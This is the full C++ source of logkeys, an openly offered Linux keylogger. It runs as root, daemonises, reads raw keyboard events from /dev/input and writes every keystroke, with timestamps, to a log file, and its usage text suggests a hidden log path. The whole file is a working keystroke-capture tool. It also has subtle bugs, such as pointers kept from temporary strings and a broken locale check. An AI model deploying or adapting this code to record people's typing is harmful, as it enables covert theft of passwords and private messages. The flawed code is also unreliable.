/*
  Copyleft (ɔ) 2009 Kernc
  This program is free software. It comes with absolutely no warranty whatsoever.
  See COPYING for further information.
  
  Project homepage: http://code.google.com/p/logkeys/
*/

#include <cstdio>
#include <cerrno>
#include <cwchar>
#include <cstring>
#include <sstream>
#include <cstdlib>
#include <csignal>
#include <error.h>
#include <unistd.h>
#include <getopt.h>
#include <sys/file.h>
#include <sys/stat.h>
#include <linux/input.h>

#include "keytables.cc"  // character and function key tables and helper functions

#ifdef HAVE_CONFIG_H
# include <config.h>  // include config produced from ./configure
#endif

#ifndef  PACKAGE_VERSION
# define PACKAGE_VERSION "0.1.0"  // if PACKAGE_VERSION wasn't defined in <config.h>
#endif

#define INPUT_EVENT_PATH "/dev/input/"
#define DEFAULT_LOG_FILE "/var/log/logkeys.log"
#define PID_FILE         "/var/run/logkeys.pid"

namespace logkeys {

void usage()
{
  fprintf(stderr,
"Usage: logkeys [OPTION]...\n"
"Log depressed keyboard keys.\n"
"\n"
"  -s, --start               start logging keypresses\n"
"  -m, --keymap=FILE         use keymap FILE\n"
"  -o, --output=FILE         log output to FILE (" DEFAULT_LOG_FILE ")\n"
"  -u, --us-keymap           use en_US keymap instead of configured default\n"
"  -k, --kill                kill running logkeys process\n"
"  -d, --device=FILE         input event device (eventX from " INPUT_EVENT_PATH ")\n"
"  -?, --help                print this help screen\n"
"      --export-keymap=FILE  export configured keymap to FILE and exit\n"
"      --no-func-keys        log only character keys\n"
"\n"
"Examples: logkeys -s -m mylang.map -o ~/.secret/keys.log\n"
"          logkeys -s -d /dev/input/event6\n"
"          logkeys -k\n"
"\n"
"logkeys version: " PACKAGE_VERSION "\n"
"logkeys homepage: <http://code.google.com/p/logkeys/>\n"
  );
}

// executes cmd and returns string ouput or "ERR" on pipe error
std::string execute(const char* cmd)
{
    FILE* pipe = popen(cmd, "r");
    if (!pipe)
      error(EXIT_FAILURE, errno, "Pipe error");
    char buffer[128];
    std::string result = "";
    while(!feof(pipe))
    	if(fgets(buffer, 128, pipe) != NULL)
    		result += buffer;
    pclose(pipe);
    return result;
}

struct arguments
{
  bool start;          // start keylogger, -s switch
  bool kill;           // stop keylogger, -k switch
  bool us_keymap;      // use default US keymap, -u switch
  int  export_keymap;  // export keymap obtained from dumpkeys, --export-keymap
  int  nofunc;         // only log character keys (e.g. 'c', '2', etc.) and don't log function keys (e.g. <LShift>, etc.), --no-func-keys switch
  char * logfile;      // user-specified log filename, -o switch
  char * keymap;       // user-specified keymap file, -m switch or --export-keymap
  char * device;       // user-specified input event device, given with -d switch
} args = {0};  // default all args to 0x0

int input_fd = -1;  // input event device file descriptor; global so that signal_handler() can access it

void signal_handler(int signal)
{
  if (input_fd != -1)
    close(input_fd);  // closing input file will break the infinite while loop
}

void set_utf8_locale()
{
  // set locale to common UTF-8 for wchars to be recognized correctly
  if(setlocale(LC_CTYPE, "en_US.UTF-8") == NULL) { // if en_US.UTF-8 isn't available
    char *locale = setlocale(LC_CTYPE, "");  // try the locale that corresponds to the value of the associated environment variable LC_CTYPE
    if (locale == NULL || 
        strstr(locale, "UTF-8") == NULL || strstr(locale, "UTF8") == NULL ||
        strstr(locale, "utf-8") == NULL || strstr(locale, "utf8") == NULL)
      error(EXIT_FAILURE, 0, "LC_CTYPE locale must be of UTF-8 type");
  }
}

void exit_cleanup(int status, void *discard)
{
  // TODO:
}

void create_PID_file()
{
  // create temp file carrying PID for later retrieval
  int temp_fd = open(PID_FILE, O_WRONLY | O_CREAT | O_EXCL, 0644);
  if (temp_fd != -1) {
    char pid_str[16] = {0};
    sprintf(pid_str, "%d", getpid());
    if (write(temp_fd, pid_str, strlen(pid_str)) == -1)
      error(EXIT_FAILURE, errno, "Error writing to PID file '" PID_FILE "'");
    close(temp_fd);
  }
  else {
    if (errno == EEXIST)
         error(EXIT_FAILURE, errno, "Another process already running? Quitting. (" PID_FILE ")");
    else error(EXIT_FAILURE, errno, "Error opening PID file '" PID_FILE "'");
  }
}

void kill_existing_process()
{
  pid_t pid;
  bool via_file = true;
  bool via_pipe = true;
  FILE *temp_file = fopen(PID_FILE, "r");
  
  via_file &= (temp_file != NULL);
  
  if (via_file) {  // kill process with pid obtained from PID file
    via_file &= (fscanf(temp_file, "%d", &pid) == 1);
    fclose(temp_file);
  }
  
  if (!via_file) {  // if reading PID from temp_file failed, try ps-grep pipe
    const char *pipe_cmd = (std::string("ps ax | grep '") + program_invocation_name + "' | grep -v grep").c_str();
    via_pipe &= (sscanf(execute(pipe_cmd).c_str(), "%d", &pid) == 1);
    via_pipe &= (pid != getpid());
  }
  
  if (via_file || via_pipe) {
    remove(PID_FILE);
    kill(pid, SIGINT);

    exit(EXIT_SUCCESS);  // process killed successfully, exit
  }
  error(EXIT_FAILURE, 0, "No process killed");
}

void set_signal_handling()
{ // catch SIGHUP, SIGINT and SIGTERM signals to exit gracefully
  struct sigaction act = {};
  act.sa_handler = signal_handler;
  sigaction(SIGHUP,  &act, NULL);
  sigaction(SIGINT,  &act, NULL);
  sigaction(SIGTERM, &act, NULL);
}

void determine_system_keymap()
{
  // custom map will be used; erase existing US keymapping
  memset(char_keys,  '\0', sizeof(char_keys));
  memset(shift_keys, '\0', sizeof(shift_keys));
  memset(altgr_keys, '\0', sizeof(altgr_keys));
  
  // get keymap from dumpkeys
  // if one knows of a better, more portable way to get wchar_t-s from symbolic keysym-s from `dumpkeys` or `xmodmap` or another, PLEASE LET ME KNOW! kthx
  std::stringstream ss, dump(execute("dumpkeys -n | grep '^\\([[:space:]]shift[[:space:]]\\)*\\([[:space:]]altgr[[:space:]]\\)*keycode'"));  // see example output after i.e. `loadkeys slovene`
  std::string line;

  unsigned int i = 0;   // keycode
  int index;
  int utf8code;      // utf-8 code of keysym answering keycode i
  
  while (std::getline(dump, line)) {
    ss.clear();
    ss.str("");
    utf8code = 0;
    
    // replace any U+#### with 0x#### for easier parsing
    index = line.find("U+", 0);
    while (static_cast<std::string::size_type>(index) != std::string::npos) {
      line[index] = '0'; line[index + 1] = 'x';
      index = line.find("U+", index);
    }
    
    if (++i >= sizeof(char_or_func)) break;  // only ever map keycodes up to 128 (currently N_KEYS_DEFINED are used)
    if (!is_char_key(i)) continue;  // only map character keys of keyboard
    
    assert(line.size() > 0);
    if (line[0] == 'k') {  // if line starts with 'keycode'
      index = to_char_keys_index(i);
      
      ss << &line[14];  // 1st keysym starts at index 14 (skip "keycode XXX = ")
      ss >> std::hex >> utf8code;
      // 0XB00CLUELESS: 0xB00 is added to some keysyms that are preceeded with '+'; I don't really know why; see `man keymaps`; `man loadkeys` says numeric keysym values aren't to be relied on, orly?
      if (line[14] == '+' && (utf8code & 0xB00)) utf8code ^= 0xB00; 
      char_keys[index] = static_cast<wchar_t>(utf8code);
      
      // if there is a second keysym column, assume it is a shift column
      if (ss >> std::hex >> utf8code) {
        if (line[14] == '+' && (utf8code & 0xB00)) utf8code ^= 0xB00;
        shift_keys[index] = static_cast<wchar_t>(utf8code);
      }
      
      // if there is a third keysym column, assume it is an altgr column
      if (ss >> std::hex >> utf8code) {
        if (line[14] == '+' && (utf8code & 0xB00)) utf8code ^= 0xB00;
        altgr_keys[index] = static_cast<wchar_t>(utf8code);
      }
      
      continue;
    }
    
    // else if line starts with 'shift i'
    index = to_char_keys_index(--i);
    ss << &line[21];  // 1st keysym starts at index 21 (skip "\tshift\tkeycode XXX = " or "\taltgr\tkeycode XXX = ")
    ss >> std::hex >> utf8code;
    if (line[21] == '+' && (utf8code & 0xB00)) utf8code ^= 0xB00;  // see line 0XB00CLUELESS
    
    if (line[1] == 's')  // if line starts with "shift"
      shift_keys[index] = static_cast<wchar_t>(utf8code);
    if (line[1] == 'a')  // if line starts with "altgr"
      altgr_keys[index] = static_cast<wchar_t>(utf8code);
  } // while (getline(dump, line))
}

void parse_input_keymap()
{
  // custom map will be used; erase existing US keytables
  memset(char_keys,  '\0', sizeof(char_keys));
  memset(shift_keys, '\0', sizeof(shift_keys));
  memset(altgr_keys, '\0', sizeof(altgr_keys));
  
  stdin = freopen(args.keymap, "r", stdin);
  if (stdin == NULL)
    error(EXIT_FAILURE, errno, "Error opening input keymap '%s'", args.keymap);
  
  unsigned int i = -1;
  unsigned int line_number = 0;
  wchar_t func_string[32];
  wchar_t line[32];
  
  while (!feof(stdin)) {
    
    if (++i >= sizeof(char_or_func)) break;  // only ever read up to 128 keycode bindings (currently N_KEYS_DEFINED are used)
    
    if (is_used_key(i)) {
      ++line_number;
      if(fgetws(line, sizeof(line), stdin) == NULL) {
        if (feof(stdin)) break;
        else error_at_line(EXIT_FAILURE, errno, args.keymap, line_number, "fgets() error");
      }
      // line at most 8 characters wide (func lines are "1234567\n", char lines are "1 2 3\n")
      if (wcslen(line) > 8) // TODO: replace 8*2 with 8 and wcslen()!
        error_at_line(EXIT_FAILURE, 0, args.keymap, line_number, "Line too long!");
      // terminate line before any \r or \n
      std::wstring::size_type last = std::wstring(line).find_last_not_of(L"\r\n");
      if (last == std::wstring::npos)
        error_at_line(EXIT_FAILURE, 0, args.keymap, line_number, "No characters on line");
      line[last + 1] = '\0';
    }
    
    if (is_char_key(i)) {
      unsigned int index = to_char_keys_index(i);
      if (swscanf(line, L"%lc %lc %lc", &char_keys[index], &shift_keys[index], &altgr_keys[index]) < 1) {
        error_at_line(EXIT_FAILURE, 0, args.keymap, line_number, "Too few input characters on line");
      }
    }
    if (is_func_key(i)) {
      if (i == KEY_SPACE) continue;  // space causes empty string and trouble
      if (swscanf(line, L"%7ls", &func_string[0]) != 1)
        error_at_line(EXIT_FAILURE, 0, args.keymap, line_number, "Invalid function key string");  // does this ever happen?
      wcscpy(func_keys[to_func_keys_index(i)], func_string);
    }
  } // while (!feof(stdin))
  fclose(stdin);
  
  if (line_number < N_KEYS_DEFINED)
#define QUOTE(x) #x  // quotes x so it can be used as (char*)
    error(EXIT_FAILURE, 0, "Too few lines in input keymap '%s'; There should be " QUOTE(N_KEYS_DEFINED) " lines!", args.keymap);
}

void export_keymap_to_file()
{
  int keymap_fd = open(args.keymap, O_CREAT | O_EXCL | O_WRONLY, 0644);
  if (keymap_fd == -1)
    error(EXIT_FAILURE, errno, "Error opening output file '%s'", args.keymap);
  char buffer[32];
  int buflen = 0;
  unsigned int index;
  for (unsigned int i = 0; i < sizeof(char_or_func); ++i) {
    buflen = 0;
    if (is_char_key(i)) {
      index = to_char_keys_index(i);
      // only export non-null characters
      if (char_keys[index]  != L'\0' && 
          shift_keys[index] != L'\0' && 
          altgr_keys[index] != L'\0')
        buflen = sprintf(buffer, "%lc %lc %lc\n", char_keys[index], shift_keys[index], altgr_keys[index]);
      else if (char_keys[index]  != L'\0' && 
               shift_keys[index] != L'\0')
        buflen = sprintf(buffer, "%lc %lc\n", char_keys[index], shift_keys[index]);
      else if (char_keys[index] != L'\0')
        buflen = sprintf(buffer, "%lc\n", char_keys[index]);
      else  // if all \0, export nothing on that line (=keymap will not parse)
        buflen = sprintf(buffer, "\n");
    }
    else if (is_func_key(i)) {
      buflen = sprintf(buffer, "%ls\n", func_keys[to_func_keys_index(i)]);
    }
    
    if (is_used_key(i))
      if (write(keymap_fd, buffer, buflen) < buflen)
        error(EXIT_FAILURE, errno, "Error writing to keymap file '%s'", args.keymap);
  }
  close(keymap_fd);
  error(EXIT_SUCCESS, 0, "Success writing keymap to file '%s'", args.keymap);
  exit(EXIT_SUCCESS);
}

void determine_input_device()
{
  // extract input number from /proc/bus/input/devices (I don't know how to do it better. If you have an idea, please let me know.)
  std::string output = execute("grep Name /proc/bus/input/devices | grep -nE '[Kk]eyboard|kbd'");

  std::stringstream input_dev_index;
  input_dev_index << INPUT_EVENT_PATH;
  input_dev_index << "event";
  input_dev_index << (atoi(output.c_str()) - 1);  // the correct input event # is (output - 1)

  args.device = const_cast<char*>(input_dev_index.str().c_str());  // const_cast safe because original isn't modified
}

int main(int argc, char **argv)
{  
  on_exit(exit_cleanup, NULL);
  
  if (geteuid()) error(EXIT_FAILURE, errno, "Got r00t?");

  // default log file will be used if none specified
  args.logfile = (char*) DEFAULT_LOG_FILE;
  
  { // process options and arguments
    
    struct option long_options[] = {
      {"start",     no_argument,       0, 's'},
      {"keymap",    required_argument, 0, 'm'},
      {"output",    required_argument, 0, 'o'},
      {"us-keymap", no_argument,       0, 'u'},
      {"kill",      no_argument,       0, 'k'},
      {"device",    required_argument, 0, 'd'},
      {"help",      no_argument,       0, '?'},
#define EXPORT_KEYMAP_INDEX 7
      {"export-keymap", required_argument, &args.export_keymap, 1},  // option_index of export-keymap is EXPORT_KEYMAP_INDEX (7)
      {"no-func-keys",  no_argument,       &args.nofunc,        1},
      {0}
    };
    
    char c;
    int option_index;
    
    while ((c = getopt_long(argc, argv, "sm:o:ukd:?", long_options, &option_index)) != -1)
      switch (c) {
        case 's': args.start = true;     break;
        case 'm': args.keymap = optarg;  break;
        case 'o': args.logfile = optarg; break;
        case 'u': args.us_keymap = true; break;
        case 'k': args.kill = true;      break;
        case 'd': args.device = optarg;  break;
        
        case  0 : 
          if (option_index == EXPORT_KEYMAP_INDEX)
            args.keymap = optarg; 
          break;
        
        case '?': usage(); exit(EXIT_SUCCESS);
        default : usage(); exit(EXIT_FAILURE);
      }

    while(optind < argc)
      error(0, 0, "Non-option argument %s", argv[optind++]);
  } // process arguments
  
  // kill existing logkeys process
  if (args.kill) kill_existing_process();
  
  if (!args.start && !args.export_keymap) { usage(); exit(EXIT_FAILURE); }
  
  // check for incompatible flags
  if (args.keymap && args.us_keymap) {
    error(EXIT_FAILURE, 0, "Incompatible flags '-m' and '-u'. See usage.");
  }
  
  set_utf8_locale();
  
  if (args.start && args.keymap && !args.export_keymap) {
    // read keymap from file
    parse_input_keymap();
  }  
  else if ((args.start && !args.us_keymap) || args.export_keymap) {
    // get keymap used by the system and optionally export it to file
    determine_system_keymap();
    
    // export keymap if so requested
    if (args.export_keymap) export_keymap_to_file();
  }
  
  if (args.device == NULL) {  // no device given with -d switch
    determine_input_device();
  } 
  else {  // event device supplied as -d argument
    std::string d(args.device);
    std::string::size_type i = d.find_last_of('/');
    args.device = const_cast<char*>((std::string(INPUT_EVENT_PATH) + d.substr(i == std::string::npos ? 0 : i + 1)).c_str());
  }
  
  set_signal_handling();
  
  int nochdir;
  if (args.logfile[0] != '/')
       nochdir = 1;  // don't chdir (logfile specified with relative path)
  else nochdir = 0;
  int noclose = 1;  // don't close streams (stderr used)
  if (daemon(nochdir, noclose) == -1)  // become daemon
    error(EXIT_FAILURE, errno, "Failed to become daemon");
  close(STDIN_FILENO); close(STDOUT_FILENO);  // leave stderr open
  
  // open input device for reading
  input_fd = open(args.device, O_RDONLY);
  if (input_fd == -1) {
    error(EXIT_FAILURE, errno, "Error opening input event device '%s'", args.device);
  }
  
  // if log file is other than default, then better seteuid() to the getuid() in order to ensure user can't write to where she shouldn't!
  if (strcmp(args.logfile, DEFAULT_LOG_FILE) != 0) {
    seteuid(getuid());
    setegid(getgid());
  }
  
  // open log file as stdout (if file doesn't exist, create it with safe 0600 permissions)
  umask(0177);
  stdout = freopen(args.logfile, "a", stdout);
  if (stdout == NULL) {
    error(0, errno, "Error opening output file '%s'", args.logfile);
    exit(EXIT_FAILURE);
  }
  
  // now we need those privileges back in order to create system-wide PID_FILE
  seteuid(0); setegid(0);
  
  create_PID_file();
  
  // now we've got everything we need, finally drop privileges by becoming 'nobody'
  setegid(65534); seteuid(65534);
  
  unsigned int scan_code, prev_code = 0;  // the key code of the pressed key (some codes are from "scan code set 1", some are different (see <linux/input.h>)
  struct input_event event;
  char timestamp[32];  // timestamp string, long enough to hold format "\n%F %T%z > "
  char repeat[16];  // holds "key repeated" string of the format "<x%d>"
  bool shift_in_effect = false;
  bool altgr_in_effect = false;
  bool ctrl_in_effect = false;  // used for identifying Ctrl+C / Ctrl+D
  int count_repeats = 0;  // count_repeats differs from the actual number of repeated characters!! only the OS knows how these two values are related (by respecting configured repeat speed and delay)

  time_t cur_time;
  time(&cur_time);
#define TIME_FORMAT "%F %T%z > "
  strftime(timestamp, sizeof(timestamp), "\n" TIME_FORMAT, localtime(&cur_time));
  
  fprintf(stdout, "Logging started ...\n%s", timestamp);
  fflush(stdout);
  
  // infinite loop: exit gracefully by receiving SIGHUP, SIGINT or SIGTERM (of which handler closes input_fd)
  while (read(input_fd, &event, sizeof(struct input_event)) > 0) {
    
// these event.value-s aren't defined in <linux/input.h> ?
#define EV_MAKE   1  // when key pressed
#define EV_BREAK  0  // when key released
#define EV_REPEAT 2  // when key switches to repeating after short delay
    
    if (event.type != EV_KEY) continue;  // keyboard events are always of type EV_KEY
      
    scan_code = event.code;
    
    if (scan_code >= sizeof(char_or_func)) {  // keycode out of range, log error
      fprintf(stdout, "<E-%x>", scan_code);
      continue;
    }
    
    // on key repeat ; must check before on key press
    if (event.value == EV_REPEAT) {
      ++count_repeats;
    } else if (count_repeats) {
      if (prev_code == KEY_RIGHTSHIFT || prev_code == KEY_LEFTCTRL || 
          prev_code == KEY_RIGHTALT   || prev_code == KEY_LEFTALT  || 
          prev_code == KEY_LEFTSHIFT  || prev_code == KEY_RIGHTCTRL);  // do nothing if the cause of repetition are these function keys
      else {
        if (args.nofunc && is_func_key(prev_code));  // if repeated was function key, and if we don't log function keys, then don't log repeat either
        else {
          sprintf(repeat, "<#+%d>", count_repeats);  // else print some dubious note of repetition
          fprintf(stdout, "%s", repeat);
        }
      }
      count_repeats = 0;  // reset count for future use
    }
    
    // on key press
    if (event.value == EV_MAKE) {
      
      // on ENTER key or Ctrl+C/Ctrl+D event append timestamp
      if (scan_code == KEY_ENTER || scan_code == KEY_KPENTER ||
          (ctrl_in_effect && (scan_code == KEY_C || scan_code == KEY_D))) {
        if (ctrl_in_effect)
          fprintf(stdout, "%lc", char_keys[to_char_keys_index(scan_code)]);  // log C or D
        strftime(timestamp, sizeof(timestamp), "\n" TIME_FORMAT, localtime(&event.time.tv_sec));
        fprintf (stdout, "%s", timestamp);  // then newline and timestamp
        continue;  // but don't log "<Enter>"
      }
      
      if (scan_code == KEY_LEFTSHIFT || scan_code == KEY_RIGHTSHIFT)
        shift_in_effect = true;
      if (scan_code == KEY_RIGHTALT)
        altgr_in_effect = true;
      if (scan_code == KEY_LEFTCTRL || scan_code == KEY_RIGHTCTRL)
        ctrl_in_effect = true;
      
      // print character or string coresponding to received keycode; only print chars when not \0
      if (is_char_key(scan_code)) {
        wchar_t wch;
        if (altgr_in_effect) {
          wch = altgr_keys[to_char_keys_index(scan_code)];
          if (wch != L'\0') fprintf(stdout, "%lc", wch);
          else if (shift_in_effect) {
            wch = shift_keys[to_char_keys_index(scan_code)];
            if (wch != L'\0') fprintf(stdout, "%lc", wch);
          }
          else {
            wch = char_keys[to_char_keys_index(scan_code)];
            if (wch != L'\0') fprintf(stdout, "%lc", wch);
          }
        } 
        else if (shift_in_effect) {
          wch = shift_keys[to_char_keys_index(scan_code)];
          if (wch != L'\0') fprintf(stdout, "%lc", wch);
        }
        else {
          wch = char_keys[to_char_keys_index(scan_code)];
          if (wch != L'\0') fprintf(stdout, "%lc", wch);
        }
      } 
      else if (is_func_key(scan_code)) {
        if (!args.nofunc) {  // only log function keys if --no-func-keys not requested
          fprintf(stdout, "%ls", func_keys[to_func_keys_index(scan_code)]);
        } 
        else if (scan_code == KEY_SPACE || scan_code == KEY_TAB) {
          // but always log a single space for Space and Tab keys
          fprintf(stdout, " ");
        }
      }
      else fprintf(stdout, "<E-%x>", scan_code);  // keycode is neither of character nor function, log error
    } // if (EV_MAKE)
    
    // on key release
    if (event.value == EV_BREAK) {
      if (scan_code == KEY_LEFTSHIFT || scan_code == KEY_RIGHTSHIFT)
        shift_in_effect = false;
      if (scan_code == KEY_RIGHTALT)
        altgr_in_effect = false;
      if (scan_code == KEY_LEFTCTRL || scan_code == KEY_RIGHTCTRL)
        ctrl_in_effect = false;
    }
    
    prev_code = scan_code;
    fflush(stdout);
  } // while (read(input_fd))
  
  // append final timestamp, close files and exit
  time(&cur_time);
  strftime(timestamp, sizeof(timestamp), "%F %T%z", localtime(&cur_time));
  fprintf(stdout, "\n\nLogging stopped at %s\n\n", timestamp);
  
  fclose(stdout);
  
  remove(PID_FILE);
  
  exit(EXIT_SUCCESS);
} // main()

} // namespace logkeys

int main(int argc, char** argv) {
  logkeys::main(argc, argv);
}